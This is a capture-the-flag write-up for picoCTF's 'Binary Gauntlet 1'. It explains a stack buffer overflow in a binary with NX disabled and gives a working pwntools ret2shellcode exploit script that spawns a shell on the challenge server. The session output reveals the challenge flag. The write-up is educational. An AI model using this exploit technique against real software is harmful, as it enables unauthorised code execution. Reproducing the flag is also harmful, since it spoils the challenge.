# Writeup: Binary Gauntlet 1

## Introduction

In this challenge we will be taking advantage of the ret2shellcode vulnerability. To start off we will check the protections of the binary to figure out what vectors of attack we can take.
```
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
    Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   67 Symbols        No    0      3./gauntlet
```
As you can see nx is disabled meaning we can execute shellcode on the stack, this will be important later when we dissect the dissasembled binary.

## Disassembly

Next we will go into gdb and disassemble the main function to see what we are dealing with. I have taken the liberty of translating the disassembled code to C to make the code readable.
```
    void func(int argc, char **argv) {
        char buf[0x70];           
        char *heap = malloc(1000);  

        printf("%p", buf);
        fflush(stdout);

        fgets(heap, 1000, stdin);
        heap[999] = '\0';

        printf(heap);
        fflush(stdout);

        fgets(heap, 1000, stdin);
        heap[999] = '\0';

        strcpy(buf, heap);    
    }
```

As you can see there is a buffer to which we can write our shellcode to and the binary prints out the buffer which means we can easily take that address and write it to the end of the buffer (after padding it) so that we can overwrite the return address allowing our shellcode to execute. 

Quick side note: In the assembly code we can see that the buffer is located at [rbp - 0x70] which is 112 bytes. In a 64 bit stack frame the return address is always located at 8 bytes after rbp so if 112 bytes have been allocated below rbp to make space for the buffer then the offset to the return address is 120 which is where the calculation of the offset comes from in the script.

## Results

Now all that is left to do is to implement the solution in python using pwn tools.
```
    from pwn import *

    context.arch = 'amd64'
    p = remote('wily-courier.picoctf.net', 60340)
    local_addr = p.recvuntil(b'\n')
    local_addr = int(local_addr, 16)
    shellcode = asm(shellcraft.sh())
    payload = shellcode + b'A' * (120 - len(shellcode)) + p64(local_addr)
    p.sendline(b'Hello')
    p.sendline(payload)

    p.interactive()
```

Finally all that is left to do is run it and get the flag.
```
    [+] Opening connection to wily-courier.picoctf.net on port 60340: Done
    [*] Switching to interactive mode
    Hello
    $ cat flag.txt
    409673e4194d82517b322d6a85637d20
    $ exit
    [*] Got EOF while reading in interactive
    $
    $
    [*] Closed connection to wily-courier.picoctf.net port 60340
    [*] Got EOF while sending in interactive
```
As you can see we got the flag. Note that the flag does not have the typical picoCTF{} wrapper, this is fine since the challenge description warned that the flag would not have it.
